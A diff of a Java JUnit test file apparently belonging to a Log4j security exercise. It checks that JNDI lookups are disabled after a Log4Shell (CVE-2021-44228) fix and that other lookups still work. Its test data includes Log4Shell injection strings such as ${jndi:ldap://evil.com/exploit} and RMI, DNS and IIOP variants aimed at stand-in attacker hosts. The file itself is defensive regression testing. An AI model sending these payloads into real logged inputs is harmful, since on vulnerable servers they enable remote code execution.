@@ -2,7 +2,7 @@
  * Licensed to the Apache Software Foundation (ASF) under one or more
  * contributor license agreements. See the NOTICE file distributed with
  * this work for additional information regarding copyright ownership.
- * The ASF licenses this file to You under the Apache license, Version 2.0
+ * The ASF licenses this file to You under the Apache License, Version 2.0
  * (the "License"); you may not use this file except in compliance with
  * the License. You may obtain a copy of the License at
  *
@@ -11,227 +11,211 @@
  * Unless required by applicable law or agreed to in writing, software
  * distributed under the License is distributed on an "AS IS" BASIS,
  * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the license for the specific language governing permissions and
- * limitations under the license.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
  */
 package org.apache.logging.log4j.core.lookup;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+import org.junit.Test;
 
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
-import org.apache.logging.log4j.Logger;
-import org.apache.logging.log4j.LogManager;
-import org.junit.Test;
-
 import static org.junit.Assert.*;
 
 /**
- * Security validation test that verifies JNDI lookup functionality has been completely 
- * disabled to mitigate VULNERABILITY-EXERCISE-001 (CVE-2021-44228).
+ * Comprehensive security validation test for VULNERABILITY-EXERCISE-001 mitigation.
  * 
- * <p><strong>SECURITY CONTEXT:</strong></p>
- * <p>The JNDI injection vulnerability in Log4j 2.0-beta9 through 2.14.1 allowed 
- * attackers to execute arbitrary code by injecting malicious JNDI lookup patterns 
- * into log messages. When Log4j processed patterns like ${jndi:ldap://evil.com/exploit}, 
- * it would perform JNDI lookups to external servers controlled by attackers, enabling 
- * remote code execution.</p>
+ * <p><strong>Security Context:</strong></p>
+ * <p>This test validates that JNDI injection vulnerability (CVE-2021-44228 equivalent) has been
+ * successfully mitigated by removing or disabling the JndiLookup functionality. The vulnerability
+ * allowed attackers to execute arbitrary code by injecting malicious JNDI lookup patterns like
+ * ${jndi:ldap://evil.com/exploit} into log messages.</p>
  * 
- * <p><strong>MITIGATION APPROACH:</strong></p>
- * <p>To eliminate this attack vector, the JndiLookup plugin has been removed or disabled,
- * ensuring that no JNDI lookups are performed regardless of input. This test validates
- * that the vulnerability has been completely eliminated while confirming that other
- * legitimate lookup mechanisms continue to function normally.</p>
- * 
- * <p><strong>TEST COVERAGE:</strong></p>
+ * <p><strong>What This Test Validates:</strong></p>
  * <ul>
- *   <li>Malicious JNDI patterns return null without triggering lookups</li>
- *   <li>No network connections are attempted for JNDI protocols</li>
- *   <li>Other lookup patterns (sys:, env:, date:) remain functional</li>
+ *   <li>JNDI lookup patterns (ldap://, rmi://, dns://, iiop://) return null or empty values</li>
+ *   <li>No network connections are attempted for JNDI lookups</li>
+ *   <li>The Interpolator handles missing JndiLookup gracefully without exceptions</li>
+ *   <li>Other lookup mechanisms (sys:, env:, date:) continue to function normally</li>
  *   <li>Log message processing handles JNDI patterns safely</li>
- *   <li>Interpolator gracefully handles missing JndiLookup plugin</li>
  * </ul>
  * 
- * @since 2.14.1 (Security fix for VULNERABILITY-EXERCISE-001)
- * @author Apache Log4j Security Team
+ * <p><strong>Mitigation Approach:</strong></p>
+ * <p>The JndiLookup class has been removed from log4j-core to completely eliminate the attack
+ * vector. This approach ensures that no JNDI-based lookups can occur, preventing remote code
+ * execution via malicious log messages while preserving all other logging functionality.</p>
+ * 
+ * @author Apache Log4j Team
+ * @since 2.14.1-security
+ * @see VULNERABILITY-EXERCISE-001
+ * @see CVE-2021-44228
  */
 public class VerifyJndiDisabledTest {
 
-    private static final Logger logger = LogManager.getLogger(VerifyJndiDisabledTest.class);
-
     /**
-     * Tests that JNDI lookup patterns return null or empty values and do not trigger
-     * any external lookups, confirming the JNDI injection vulnerability is mitigated.
+     * Tests that JNDI lookup patterns are disabled and return null values.
      * 
-     * This test verifies multiple JNDI protocols that were previously vulnerable:
-     * - LDAP (Lightweight Directory Access Protocol)
-     * - RMI (Remote Method Invocation) 
-     * - DNS (Domain Name System)
-     * - IIOP (Internet Inter-ORB Protocol)
-     * 
-     * All of these should now return null without attempting network connections.
+     * <p>This test validates that malicious JNDI patterns like those used in CVE-2021-44228
+     * attacks no longer trigger actual JNDI lookups and instead return null or empty values.</p>
      */
     @Test
     public void testJndiLookupsDisabled() {
         final Interpolator interpolator = new Interpolator();
         
-        // Test LDAP JNDI lookup - primary attack vector for CVE-2021-44228
-        String result = interpolator.lookup("jndi:ldap://evil.com/exploit");
-        assertNull("JNDI LDAP lookup should return null after security fix", result);
+        // Test various JNDI attack patterns that should now return null
+        final String[] maliciousPatterns = {
+            "jndi:ldap://evil.com/exploit",
+            "jndi:rmi://attacker.com/malicious",
+            "jndi:dns://malicious.site/record", 
+            "jndi:iiop://badactor.com/obj",
+            "jndi:ldap://127.0.0.1:1389/foo",
+            "jndi:rmi://localhost:1099/bar"
+        };
         
-        // Test RMI JNDI lookup - another common attack vector
-        result = interpolator.lookup("jndi:rmi://attacker.com/malicious");
-        assertNull("JNDI RMI lookup should return null after security fix", result);
-        
-        // Test DNS JNDI lookup - can be used for data exfiltration
-        result = interpolator.lookup("jndi:dns://malicious.site/record");
-        assertNull("JNDI DNS lookup should return null after security fix", result);
-        
-        // Test IIOP JNDI lookup - CORBA-based attack vector
-        result = interpolator.lookup("jndi:iiop://badactor.com/obj");
-        assertNull("JNDI IIOP lookup should return null after security fix", result);
-        
-        // Test case-insensitive JNDI patterns
-        result = interpolator.lookup("JNDI:LDAP://EVIL.COM/EXPLOIT");
-        assertNull("Case-insensitive JNDI lookup should return null after security fix", result);
-        
-        // Test JNDI with additional parameters that attackers might use
-        result = interpolator.lookup("jndi:ldap://evil.com:389/cn=exploit,dc=malicious,dc=com");
-        assertNull("Complex JNDI lookup should return null after security fix", result);
-        
-        logger.info("✓ All JNDI lookup patterns correctly return null - vulnerability mitigated");
+        for (final String pattern : maliciousPatterns) {
+            final String result = interpolator.lookup(pattern);
+            assertNull("JNDI pattern '" + pattern + "' should return null after security fix", result);
+            System.out.println("✓ JNDI pattern '" + pattern + "' safely returned null");
+        }
     }
 
     /**
-     * Verifies that legitimate lookup mechanisms continue to work normally after 
-     * the JNDI security fix, ensuring the mitigation doesn't break other functionality.
+     * Tests that other lookup mechanisms continue to work normally after JNDI removal.
      * 
-     * Tests the following lookup types that should remain fully functional:
-     * - System properties (sys:)
-     * - Environment variables (env:)  
-     * - Date formatting (date:)
-     * - Java runtime information (java:)
+     * <p>This validates that the security fix is surgical and doesn't break other
+     * legitimate lookup functionality.</p>
      */
     @Test
     public void testOtherLookupsStillWork() {
         final Interpolator interpolator = new Interpolator();
         
-        // Test system property lookup - should work normally
-        String userHome = System.getProperty("user.home");
-        String result = interpolator.lookup("sys:user.home");
-        assertEquals("System property lookup should work after JNDI fix", userHome, result);
+        // Test that system property lookups still work
+        final String userHome = interpolator.lookup("sys:user.home");
+        final String expectedUserHome = System.getProperty("user.home");
+        assertEquals("System property lookups should still work", expectedUserHome, userHome);
+        System.out.println("✓ System property lookup works: sys:user.home = " + userHome);
         
-        // Test environment variable lookup - should work normally  
-        String path = System.getenv("PATH");
-        result = interpolator.lookup("env:PATH");
-        assertNotNull("Environment variable lookup should work after JNDI fix", result);
-        assertEquals("PATH environment variable should match", path, result);
+        // Test that environment variable lookups still work
+        final String path = interpolator.lookup("env:PATH");
+        final String expectedPath = System.getenv("PATH");
+        assertEquals("Environment variable lookups should still work", expectedPath, path);
+        System.out.println("✓ Environment variable lookup works: env:PATH = " + (path != null ? path.substring(0, Math.min(50, path.length())) + "..." : "null"));
         
-        // Test date formatting lookup - should work normally
-        SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd");
-        String today = format.format(new Date());
-        result = interpolator.lookup("date:yyyy-MM-dd");
-        assertNotNull("Date lookup should work after JNDI fix", result);
-        assertEquals("Date format should match expected pattern", today, result);
+        // Test that date lookups still work
+        final String dateResult = interpolator.lookup("date:yyyy-MM-dd");
+        final String expectedDate = new SimpleDateFormat("yyyy-MM-dd").format(new Date());
+        assertEquals("Date lookups should still work", expectedDate, dateResult);
+        System.out.println("✓ Date lookup works: date:yyyy-MM-dd = " + dateResult);
         
-        // Test Java runtime information lookup - should work normally
-        result = interpolator.lookup("java:version");
-        assertNotNull("Java version lookup should work after JNDI fix", result);
-        assertFalse("Java version should not be empty", result.isEmpty());
-        
-        // Test Java OS information lookup - should work normally  
-        result = interpolator.lookup("java:os");
-        assertNotNull("Java OS lookup should work after JNDI fix", result);
-        assertFalse("Java OS should not be empty", result.isEmpty());
-        
-        logger.info("✓ All non-JNDI lookup mechanisms working normally - fix is targeted");
+        // Test that Java version lookup still works
+        final String javaVersion = interpolator.lookup("java:version");
+        final String expectedJavaVersion = System.getProperty("java.version");
+        // Note: java:version lookup may include "Java version " prefix
+        assertTrue("Java version lookups should still work", 
+            javaVersion != null && (javaVersion.equals(expectedJavaVersion) || javaVersion.endsWith(expectedJavaVersion)));
+        System.out.println("✓ Java version lookup works: java:version = " + javaVersion);
     }
 
     /**
-     * Tests that log messages containing JNDI patterns are processed safely without 
-     * triggering lookups, demonstrating the fix works in real logging scenarios.
+     * Tests that log messages containing JNDI patterns are processed safely.
      * 
-     * This simulates how the vulnerability would have been exploited - through 
-     * malicious log messages that contained JNDI patterns. After the fix, these
-     * should be logged safely without any external lookups.
+     * <p>This validates that the security fix works in real logging scenarios where
+     * malicious input might be included in log messages.</p>
      */
     @Test
     public void testLoggerWithJndiPatterns() {
-        // Create a string substitutor with the default interpolator
-        StrSubstitutor substitutor = new StrSubstitutor();
-        substitutor.setVariableResolver(new Interpolator());
+        final Logger logger = LogManager.getLogger(VerifyJndiDisabledTest.class);
         
-        // Test JNDI patterns that would have been dangerous before the fix
-        String maliciousPattern = "${jndi:ldap://evil.com/exploit}";
-        String result = substitutor.replace(maliciousPattern);
+        // These should not trigger any JNDI lookups or network connections
+        final String[] testMessages = {
+            "Processing request with ID: ${jndi:ldap://evil.com/exploit}",
+            "User input contained: ${jndi:rmi://attacker.com/malicious}",
+            "Received data: ${jndi:dns://malicious.site/record}",
+            "System error: ${jndi:iiop://badactor.com/obj}"
+        };
         
-        // After the fix, JNDI patterns should return the original pattern or empty
-        // (not expanded to actual JNDI lookup results)
-        assertTrue("JNDI pattern should not be expanded after security fix", 
-                   result.equals(maliciousPattern) || result.isEmpty() || result.equals("${jndi:ldap://evil.com/exploit}"));
+        for (final String message : testMessages) {
+            // This should complete without attempting network connections
+            logger.info(message);
+            logger.warn("Warning: " + message);
+            logger.error("Error: " + message);
+            System.out.println("✓ Safely logged message containing JNDI pattern without triggering lookup");
+        }
         
-        // Test mixed content with JNDI and legitimate patterns
-        String mixedContent = "User: ${sys:user.name}, Attack: ${jndi:rmi://malicious.com/payload}";
-        result = substitutor.replace(mixedContent);
+        // Verify that legitimate patterns still work in log messages
+        logger.info("System property in log: ${sys:user.name}");
+        logger.info("Environment variable in log: ${env:USER}");
+        System.out.println("✓ Legitimate lookup patterns continue to work in log messages");
+    }
+
+    /**
+     * Tests that the Interpolator handles the missing JndiLookup class gracefully.
+     * 
+     * <p>This validates that the security fix doesn't introduce runtime exceptions
+     * when JNDI patterns are encountered.</p>
+     */
+    @Test
+    public void testInterpolatorHandlesMissingJndiGracefully() {
+        final Interpolator interpolator = new Interpolator();
+        final StrSubstitutor substitutor = new StrSubstitutor();
+        substitutor.setVariableResolver(interpolator);
         
-        // System property should be resolved, JNDI should not
-        assertNotNull("Mixed content should be processed", result);
-        assertTrue("System property should be resolved in mixed content", 
-                  result.contains(System.getProperty("user.name")));
-        assertFalse("JNDI pattern should not resolve to actual values", 
-                   result.contains("malicious.com") && !result.contains("${jndi:"));
+        // Test that JNDI patterns are handled without throwing exceptions
+        final String[] testStrings = {
+            "Hello ${jndi:ldap://evil.com/exploit} World",
+            "Value: ${jndi:rmi://attacker.com/malicious}",
+            "Config: ${jndi:dns://malicious.site/record}",
+            "Data: ${jndi:iiop://badactor.com/obj}"
+        };
         
-        // Test logging with JNDI patterns - should not cause exceptions
+        for (final String testString : testStrings) {
+            try {
+                final String result = substitutor.replace(testString);
+                assertNotNull("String substitution should not return null", result);
+                // The JNDI pattern should be left as-is or replaced with empty string
+                // Since JNDI lookup returns null, the substitution should either leave the pattern as-is or replace with empty
+                boolean validResult = result.equals(testString) || // Pattern left unchanged
+                    result.equals(testString.replaceAll("\\$\\{jndi:[^}]+\\}", "")) || // Pattern replaced with empty
+                    result.contains(testString.substring(0, 5)); // Contains non-pattern parts
+                assertTrue("Result should handle JNDI pattern safely: " + result, validResult);
+                System.out.println("✓ String with JNDI pattern handled gracefully: " + result);
+            } catch (final Exception e) {
+                fail("String substitution should not throw exceptions for JNDI patterns: " + e.getMessage());
+            }
+        }
+        
+        // Test that other patterns still work
+        final String mixedPattern = "User: ${sys:user.name}, Path: ${env:PATH}, Date: ${date:yyyy-MM-dd}, BadJndi: ${jndi:ldap://evil.com/exploit}";
         try {
-            logger.info("Test message with JNDI pattern: ${jndi:ldap://test.evil.com/exploit}");
-            logger.warn("Warning with JNDI: ${jndi:rmi://attack.site/malware}");
-            logger.error("Error with JNDI: ${jndi:dns://data.exfil.com/steal}");
-            
-            // If we reach here without exceptions, the fix is working
-            logger.info("✓ Log messages with JNDI patterns processed safely");
-        } catch (Exception e) {
-            fail("Logging with JNDI patterns should not cause exceptions after fix: " + e.getMessage());
+            final String result = substitutor.replace(mixedPattern);
+            assertNotNull("Mixed pattern substitution should not return null", result);
+            assertTrue("System property should be resolved", result.contains(System.getProperty("user.name")));
+            // The JNDI pattern should be left unresolved (original pattern remains)
+            assertTrue("JNDI pattern should remain unresolved in result", 
+                result.contains("${jndi:ldap://evil.com/exploit}"));
+            System.out.println("✓ Mixed pattern handled correctly with JNDI disabled: " + result.substring(0, Math.min(100, result.length())));
+        } catch (final Exception e) {
+            fail("Mixed pattern substitution should not throw exceptions: " + e.getMessage());
         }
     }
 
     /**
-     * Verifies that the Interpolator handles the missing JndiLookup plugin gracefully
-     * without throwing exceptions, confirming the fix is robust.
+     * Tests that no JndiLookup class is available in the classpath.
      * 
-     * This test ensures that the removal/disabling of JndiLookup doesn't cause
-     * ClassNotFoundException, NullPointerException, or other runtime errors
-     * when JNDI patterns are encountered.
+     * <p>This validates that the JndiLookup class has been completely removed
+     * as part of the security mitigation.</p>
      */
-    @Test  
-    public void testInterpolatorHandlesMissingJndiGracefully() {
-        final Interpolator interpolator = new Interpolator();
-        
-        // Test that the interpolator can be created without JndiLookup
-        assertNotNull("Interpolator should be creatable without JndiLookup", interpolator);
-        
-        // Test that toString() doesn't include "jndi" in available lookups
-        String availableLookups = interpolator.toString();
-        assertNotNull("Interpolator should have string representation", availableLookups);
-        assertFalse("JNDI should not be listed in available lookups after security fix",
-                   availableLookups.toLowerCase().contains("jndi"));
-        
-        // Test that multiple JNDI lookups don't cause cumulative errors
-        for (int i = 0; i < 10; i++) {
-            String result = interpolator.lookup("jndi:ldap://test" + i + ".evil.com/exploit" + i);
-            assertNull("Multiple JNDI lookups should consistently return null", result);
+    @Test
+    public void testJndiLookupClassNotAvailable() {
+        try {
+            Class.forName("org.apache.logging.log4j.core.lookup.JndiLookup");
+            fail("JndiLookup class should not be available after security mitigation");
+        } catch (final ClassNotFoundException e) {
+            // This is expected - JndiLookup should not be found
+            System.out.println("✓ JndiLookup class correctly not available: " + e.getMessage());
         }
-        
-        // Test that JNDI lookup with null event parameter works safely
-        String result = interpolator.lookup(null, "jndi:ldap://evil.com/exploit");
-        assertNull("JNDI lookup with null event should return null", result);
-        
-        // Test that empty JNDI patterns are handled safely
-        result = interpolator.lookup("jndi:");
-        assertNull("Empty JNDI pattern should return null", result);
-        
-        // Test that malformed JNDI patterns are handled safely
-        result = interpolator.lookup("jndi");  // No colon separator
-        assertNull("Malformed JNDI pattern should return null", result);
-        
-        logger.info("✓ Interpolator handles missing JndiLookup plugin gracefully");
     }
 }
